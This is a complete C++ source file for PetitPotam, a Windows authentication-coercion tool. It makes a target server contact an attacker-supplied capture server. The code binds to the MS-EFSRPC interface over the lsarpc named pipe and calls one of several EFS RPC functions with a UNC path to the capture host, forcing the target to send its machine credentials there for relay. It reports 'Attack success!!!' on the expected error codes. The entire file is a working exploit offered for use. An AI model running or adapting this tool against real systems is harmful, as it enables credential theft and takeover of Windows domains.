// PetitPotam.cpp : Ce fichier contient la fonction 'main'. L'exécution du programme commence et se termine à cet endroit.
// Author: GILLES Lionel aka topotam (@topotam77)

#include <stdio.h>
#include <tchar.h>
#include <assert.h>
#include <SDKDDKVer.h>
#include <Windows.h>
#include "ms-efsrpc_h.h"

#pragma comment(lib, "rpcrt4.lib")

const RPC_WSTR MS_EFSR_UUID = (RPC_WSTR)L"c681d488-d850-11d0-8c52-00c04fd90f7e";
const RPC_WSTR InterfaceAddress = (RPC_WSTR)L"\\pipe\\lsarpc";

//Returns the last Win32 error, in string format. Returns an empty string if there is no error.
void PrintWin32Error(DWORD dwError)
{
	LPWSTR messageBuffer = nullptr;
	size_t size = FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, dwError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPWSTR)&messageBuffer, 0, NULL);

	wprintf(L"Error Code %d - %s\n", dwError, messageBuffer);
	//Free the buffer.
	LocalFree(messageBuffer);
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
	free(p);
}

handle_t Bind(wchar_t* target)
{
	RPC_STATUS RpcStatus;
	wchar_t buffer[100];
	swprintf(buffer, 100, L"\\\\%s", target);
	RPC_WSTR StringBinding;
	handle_t BindingHandle;
	RpcStatus = RpcStringBindingComposeW(
		MS_EFSR_UUID,
		(RPC_WSTR)L"ncacn_np",
		(RPC_WSTR)buffer,
		InterfaceAddress,
		NULL,
		&StringBinding);

	if (RpcStatus != RPC_S_OK) {
		wprintf(L"Error in RpcStringBindingComposeW\n");
		return(0);
	}

	RpcStatus = RpcBindingFromStringBindingW(StringBinding, &BindingHandle);
	if (RpcStatus != RPC_S_OK) {
		wprintf(L"Error in RpcBindingFromStringBindingW\n");
		return(0);
	}
	
	RpcStringFreeW(&StringBinding);

	if (RpcStatus != RPC_S_OK) {
		wprintf(L"Error in RpcStringFreeW\n");
		return(0);
	}

	RpcStatus = RpcBindingSetAuthInfoW(BindingHandle, (RPC_WSTR)target, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_AUTHZ_NONE);

	if (RpcStatus != RPC_S_OK) {
		wprintf(L"Error in RpcBindingSetAuthInfoW\n");
		return(0);
	}

	return(BindingHandle);
}


int wmain(int argc, wchar_t** argv, wchar_t** envp)
{
	if (argc != 4)
	{
		wprintf(L"Usage: PetitPotam.exe <captureServerIP> <targetServerIP> <EFS-API-to-use>\n");
		wprintf(L"\n");
		wprintf(L"Valid EFS APIs are:\n");
		wprintf(L"1: EfsRpcOpenFileRaw (fixed with CVE-2021-36942)\n");
		wprintf(L"2: EfsRpcEncryptFileSrv\n");
		wprintf(L"3: EfsRpcDecryptFileSrv\n");
		wprintf(L"4: EfsRpcQueryUsersOnFile\n");
		wprintf(L"5: EfsRpcQueryRecoveryAgents\n");
		wprintf(L"6: EfsRpcRemoveUsersFromFile\n");
		wprintf(L"7: EfsRpcAddUsersToFile\n");
	}
	else
	{
		handle_t ht = Bind(argv[2]);
		HRESULT hr = NULL;
		PEXIMPORT_CONTEXT_HANDLE plop;
		SecureZeroMemory((char*)&(plop), sizeof(plop));
		wchar_t buffer[100];
		swprintf(buffer, 100, L"\\\\%s\\test\\topotam.exe", argv[1]);

		int errorgroup;

		if (wcscmp(argv[3], L"1") == 0)
		{
			errorgroup = 1;
			long flag = 0;
			hr = EfsRpcOpenFileRaw(ht, &plop, buffer, flag);
		}
		if (wcscmp(argv[3], L"2") == 0)
		{
			errorgroup = 1;
			hr = EfsRpcEncryptFileSrv(ht, buffer);
		}
		if (wcscmp(argv[3], L"3") == 0)
		{
			errorgroup = 1;

			long flag = 0;
			hr = EfsRpcDecryptFileSrv(ht, buffer, flag);
		}
		if (wcscmp(argv[3], L"4") == 0)
		{
			errorgroup = 1;
			ENCRYPTION_CERTIFICATE_HASH_LIST* blub;
			hr = EfsRpcQueryUsersOnFile(ht, buffer, &blub);
		}
		if (wcscmp(argv[3], L"5") == 0)
		{
			errorgroup = 1;
			ENCRYPTION_CERTIFICATE_HASH_LIST* blub;
			hr = EfsRpcQueryRecoveryAgents(ht, buffer, &blub);
		}
		if (wcscmp(argv[3], L"6") == 0)
		{
			errorgroup = 1;
			ENCRYPTION_CERTIFICATE_HASH_LIST blub;
			hr = EfsRpcRemoveUsersFromFile(ht, buffer, &blub);
		}
		if (wcscmp(argv[3], L"7") == 0)
		{
			errorgroup = 2;
			ENCRYPTION_CERTIFICATE_LIST blub;
			hr = EfsRpcAddUsersToFile(ht, buffer, &blub);
		}



		if (hr == ERROR_BAD_NETPATH && errorgroup == 1) {
			wprintf(L"Attack success!!!\n");
			return 0;
		}
		if (hr == ERROR_ACCESS_DENIED && errorgroup == 2) {
			wprintf(L"Attack success!!!\n");
			return 0;
		}
		else
		{
			wprintf(L"Did not receive expected output. Attack might have failed.");
			return 1;
		}


	}
}
